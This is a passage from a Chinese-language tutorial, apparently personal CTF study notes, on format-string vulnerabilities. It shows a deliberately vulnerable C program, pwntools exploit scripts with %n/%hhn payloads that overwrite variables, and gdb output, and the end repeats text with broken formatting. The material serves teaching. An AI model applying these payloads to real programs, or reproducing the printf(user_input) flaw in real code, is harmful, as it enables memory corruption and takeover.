punctuation">(</span>c_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%012d'</span> <span class="token operator">+</span> <span class="token string">'%6$n'</span>    <span class="token keyword">print</span> payload    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>forc<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>我用这个脚本去打我上面编译出来的程序，发现c_addr一直接收不了，因为在printf(“%p\n”,&amp;c);之前有一个scanf()语句，我发现就算是先send()一个数值也接收不到…于是我又用他的脚本编译了一次。</p></blockquote><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified c."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified a for a small number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified b for a big number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>关于pwntools里面的recvuntil脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> t <span class="token operator">=</span> tube<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recv_raw <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">:</span> b<span class="token string">"Hello World!"</span><span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' '</span><span class="token punctuation">)</span>b<span class="token string">'Hello '</span><span class="token operator">>></span><span class="token operator">></span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Matches on 'o' in 'Hello'</span><span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token string">' '</span><span class="token punctuation">,</span>b<span class="token string">'W'</span><span class="token punctuation">,</span>b<span class="token string">'o'</span><span class="token punctuation">,</span>b<span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>b<span class="token string">'Hello'</span><span class="token operator">>></span><span class="token operator">></span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Matches expressly full string</span><span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' Wor'</span><span class="token punctuation">)</span>b<span class="token string">'Hello Wor'</span><span class="token operator">>></span><span class="token operator">></span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Matches on full string, drops match</span><span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' Wor'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>b<span class="token string">'Hello'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p>结果如下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exp.py [+] Starting local process './overflow_1': pid 38170xff9583ac[*] running in new terminal: /usr/bin/gdb -q  "./overflow_1" 3817 -x "/tmp/pwnyrtF2W.gdb"[+] Waiting for debugger: Done\xac\x83\x95\xffaaaaaaaaaaaamodified c.[*] Switching to interactive mode[*] Process './overflow_1' stopped with exit code 0 (pid 3817)[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>terminal里面的结果如下</p><pre class="line-numbers language-shell"><code class="language-shell">gef➤  b printfBreakpoint 1 at 0xf7deb670: file printf.c, line 28.gef➤  cContinuing.Breakpoint 1, __printf (format=0xff958348 "\254\203\225\377", 'a' <repeats 12 times>, "%6$n") at printf.c:2828    printf.c: No such file or directory.[ Legend: Modified register | Code | Heap | Stack | String ]───────────────────────────────────────────────────────────────── registers ────$eax   : 0xff958348  →  0xff9583ac  →  0x00000315$ebx   : 0x0       $ecx   : 0x1       $edx   : 0xf7f5587c  →  0x00000000$esp   : 0xff95832c  →  0x080484d7  →  <main+76> add esp, 0x10$ebp   : 0xff9583b8  →  0x00000000$esi   : 0xf7f54000  →  0x001b1db0$edi   : 0xf7f54000  →  0x001b1db0$eip   : 0xf7deb670  →  <printf+0> call 0xf7ec1b59 <__x86.get_pc_thunk.ax>$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 ───────────────────────────────────────────────────────────────────── stack ────0xff95832c│+0x0000: 0x080484d7  →  <main+76> add esp, 0x10     ← $esp0xff958330│+0x0004: 0xff958348  →  0xff9583ac  →  0x000003150xff958334│+0x0008: 0xff958348  →  0xff9583ac  →  0x000003150xff958338│+0x000c: 0x000000c20xff95833c│+0x0010: 0xf7e326bb  →  <handle_intel+107> add esp, 0x100xff958340│+0x0014: 0xff95836e  →  0xffff00000xff958344│+0x0018: 0xff95846c  →  0xff95a323  →  "QT_QPA_PLATFORMTHEME=appmenu-qt5"0xff958348│+0x001c: 0xff9583ac  →  0x00000315─────────────────────────────────────────────────────────────── code:x86:32 ────   0xf7deb667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]   0xf7deb66d                  nop       0xf7deb66e                  xchg   ax, ax → 0xf7deb670 <printf+0>       call   0xf7ec1b59 <__x86.get_pc_thunk.ax>   ↳  0xf7ec1b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]      0xf7ec1b5c <__x86.get_pc_thunk.ax+3> ret          0xf7ec1b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]      0xf7ec1b60 <__x86.get_pc_thunk.dx+3> ret          0xf7ec1b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]      0xf7ec1b64 <__x86.get_pc_thunk.si+3> ret    ─────────────────────────────────────────────────────── arguments (guessed) ────__x86.get_pc_thunk.ax ()─────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: "overflow_1", stopped 0xf7deb670 in __printf (), reason: BREAKPOINT───────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7deb670 → __printf(format=0xff958348 "\254\203\225\377", 'a' <repeats 12 times>, "%6$n")[#1] 0x80484d7 → main()────────────────────────────────────────────────────────────────────────────────gef➤  cContinuing.[Inferior 1 (process 3817) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果输出modified c，说明c的值的确被修改成了16.</p><h4 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h4><h5 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h5><p>首先，我们来考虑一下如何修改data段的变量为一个较小的数字，比如说，<strong>小于机器字长的数字</strong>。这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。</p><blockquote><p>或许我们可以使用整型溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。</p></blockquote><p>那么我们应该怎么做呢？再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串对应的地址为格式化字符串的第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是</p><pre class="line-numbers language-c"><code class="language-c">aa<span class="token operator">%</span>k$nxx    <span class="token comment" spellcheck="true">//'k$'表示获取格式化字符串中的第k个参数，'%n'表示把已经成功输出的字符个数写入对应的整型指针参数所指的变量。这里已经成功输出的字符为'aa'，所以把2写入地址为a_addr处，也就是把a的值覆盖为2.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时对应的存储的格式化字符串(%k$nxx)已经占据了6个字符的位置，如果我们再添加两个字符aa，那么其实aa%k就是第6个参数(4个字符为1个参数)，$nxx其实就是第7个参数，后面我们如果跟上我们要覆盖的地址，那就是第8个参数，所以如果我们这里设置k为8，其实就可以覆盖了。</p><p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p><pre class="line-numbers language-assembly"><code class="language-assembly">.data:0804A024                 public a.data:0804A024 a               dd 7Bh                  ; DATA XREF: main:loc_80484F4↑r.data:0804A028                 public b.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510↑r.data:0804A028 _data           ends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>故而我们可以构造如下的利用代码</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">fora</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./overflow_1'</span><span class="token punctuation">)</span>    a_addr <span class="token operator">=</span> <span class="token number">0x0804A024</span>    payload <span class="token operator">=</span> <span class="token string">'aa%8$naa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>a_addr<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>        sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>fora<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应的结果如下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python test.py [+] Starting local process './overflow_1': pid 53530xff820b7caaaa$\xa0\x04modified a for a small number.[*] Switching to interactive mode[*] Process './overflow_1' stopped with exit code 0 (pid 5353)[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>小技巧：我们没有必要必须把地址放在最前面，放在哪里都可以，只要我们可以找到其对应的偏移即可。</p></blockquote><h5 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h5><p>上面介绍了覆盖小数字，接下来介绍一下覆盖大数字。上面我们说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？^__^当然有！(不然还写个p的笔记)</p><p>不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在x86和x64的体系结构中，变量的存储格式为小端存储，即最低有效位存储在低地址(和我们通常习惯的顺序相反)。</p><p>举个例子，0x12345678在内存中由低地址到高地址依次为\x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p><pre><code>hh    对于整数类型，printf期待一个从char提升的int尺寸的整型参数。输出一个字节h    对于整数类型，printf期待一个从short提升的int尺寸的整型参数。输出一个双字节</code></pre><p>所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。这里，我们以单字节为例。</p><p>我们准备覆盖b的值，先用ida看一下b的地址为多少</p><pre class="line-numbers language-shell"><code class="language-shell">.data:0804A028                 public b.data:0804A028 b               dd 1C8h                 ; DATA XREF: <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>可以看出，b的地址为0x0804A028</p><p>我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p><pre><code>0x0804A028 \x780x0804A029 \x560x0804A02a \x340x0804A02b \x12</code></pre><p>我们在前面确定相对偏移的过程中确定了格式化字符串的地址是格式化字符串的第6个参数。所以我们的payload基本上如下</p><pre><code>p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$n'+pad2+'%7$n'+pad3'%8$n'+pad4'%9$n'</code></pre><p>给出一个基本构造如下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span>word<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#传过来的word依次为0x78,0x56,0x34,0x12;传过来的prev依次为4,0x78,0x56,0x34</span>        result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>fmtstr<span class="token punctuation">)</span>    <span class="token keyword">return</span> fmtstr<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>size<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span><span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span>offset <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#乘法运算优先级高于左移运算，右移8位是二进制的8位，转成16进制之后就是每次右移两位。'&amp;0xff'目的是除了最右边两位不变，其它位都置零。</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token comment" spellcheck="true">#prev的初值为4,之后依次为0x78,0x56,0x34,0x12</span>    <span class="token keyword">return</span> payload    payload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中每个参数的含义基本如下</p><ul><li>offset表示要覆盖的地址的最初的偏移</li><li>size表示机器字长</li><li>addr表示将要覆盖的地址</li><li>target表示我们要覆盖为的目的变量值</li></ul><p>说实话一开始没太看懂这个payload的构造，于是我一步步分析了程序并先打印了这个fmt()函数的运行结果</p><blockquote><p>python运算中，乘法优先级在右移优先级之前。</p><p>pre1 = (0x12345678) &gt;&gt; 0 * 8</p><p>pre1 –&gt; 0x12345678</p><p>pre2 = pre1 &amp; 0xff</p><p>pre2 –&gt;0x78</p></blockquote><blockquote><p>fmt函数运行结果如下</p><p>%104c%6$hhn<br>%222c%7$hhn<br>%222c%8$hhn<br>%222c%9$hhn</p><p>payload结果如下</p><p>(\xa0\x04)\xa0\x04*\xa0\x04+\xa0\x04%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn</p><p>payload前面一段是p32形式的攻击地址 后面%(num)c%(index)$hhn表示向第index个参数处以单字节的形式写入特定数值[0x78,0x56,0x34,0x12]</p></blockquote><p>完整的exploit如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#-*- coding=utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span>word<span class="token punctuation">,</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#传过来的word依次为0x78,0x56,0x34,0x12;传过来的prev依次为0x10,0x78,0x56,0x34</span>        result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>         result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev         fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>         <span class="token keyword">print</span><span class="token punctuation">(</span>fmtstr<span class="token punctuation">)</span>    <span class="token keyword">return</span> fmtstr<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span>size<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span><span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span>offset <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#乘法运算优先级高于左移运算，右移8位是二进制的8位，转成16进制之后就是每次右移两位。'&amp;0xff'目的是除了最右边两位不变，其它位都置零。</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span> <span class="token comment" spellcheck="true">#prev的初值为4,之后依次为0x78,0x56,0x34,0x12</span>    <span class="token keyword">return</span> payload    <span class="token keyword">def</span> <span class="token function">proc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./overflow_1"</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>proc<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下</p><pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exploit.py [+] Starting local process './overflow_1': pid 2780%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn(\xa0\x04)\xa0\x04*\xa0\x04+\xa0\x04%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn0xff97f18c(\xa0\x04)\xa0\x04*\xa0\x04+\xa0\x04                                                                                                       (                                                                                                                                                                                                                             �                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             Nmodified b for a big number![*] Switching to interactive mode[*] Got EOF while reading in interactive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fmt()函数里的else部分我看了好久都没弄明白，为什么第一次写入0x78，后面还能写入0x56,0x34,0x12。因为写入的值是根据前面成功输出的字符个数来决定的，怎么会越写越小呢？</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">else</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev    fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>result = 256 + word - prev</strong>，可以看到word - prev = -(0x22)，而0x78-0x22就等于0x56，也就是我们想要写入的第二个值，那么为什么又要加256呢？</p><p><strong>%hhn是具有溢出功能的，前面成功输出的字符个数超过255就会从0重新开始计数(比如260就相当于260-256=4)。所以加256并不影响结果，那这里为什么要加256呢？因为word-prev的值是负数，不能直接使用%[num]c (num为负数)，于是先加256，在后面计算输出字符个数的时候会自动减去256。这时候就相当于写入了0x56，后面的0x34，0x12依次类推。</strong></p><blockquote><p>当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。</p><p>上面是CTF-Wiki写的，我个人的理解是用%n写入0x12345678这个数据,%n是把已经成功输出字符的个数写入对应指针指向的整型(int)变量，整型(int)变量占4个字节，但是使用%hhn只会修改1个字节。</p></blockquote><pre><code>                                                                                                                                                                                                                 �                                                                                                                                                                                                                             \xbb                                                                                                                                                                                                                             Nmodified b for a big number!</code></pre><p>[<em>] Switching to interactive mode<br>[</em>] Got EOF while reading in interactive</p><pre><code>fmt()函数里的else部分我看了好久都没弄明白，为什么第一次写入0x78，后面还能写入0x56,0x34,0x12。因为写入的值是根据前面成功输出的字符个数来决定的，怎么会越写越小呢？​```pythonelse:    result = 256 + word - prev    fmtstr = "%" + str(result) + "c"fmtstr += "%" + str(index) + "$hhn"  </code></pre><p><strong>result = 256 + word - prev</strong>，可以看到word - prev = 